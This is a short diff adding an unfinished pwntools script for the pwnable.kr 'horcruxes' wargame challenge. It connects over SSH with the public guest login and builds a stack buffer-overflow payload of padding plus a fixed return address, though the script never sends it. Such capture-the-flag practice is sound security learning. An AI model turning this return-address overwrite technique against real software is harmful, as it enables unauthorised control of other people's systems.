@@ -1,0 +1,21 @@
+from pwn import *
+import random
+
+shell = ssh('pwnable.kr', 'horcruxes', 2222, password='guest')
+sh = shell.process('nc 0 9032')
+
+A_addr = 0x809FE4B
+
+def main():
+    sh.recvuntil("Select Menu:")
+    sh.sendline('1')
+    
+    sh.recvuntil("earned? : ")
+    
+    payload = 'A' * 74 + 'B' * 4
+    payload += p32(A_addr)
+
+    
+
+if __name__ == "__main__":
+    main()
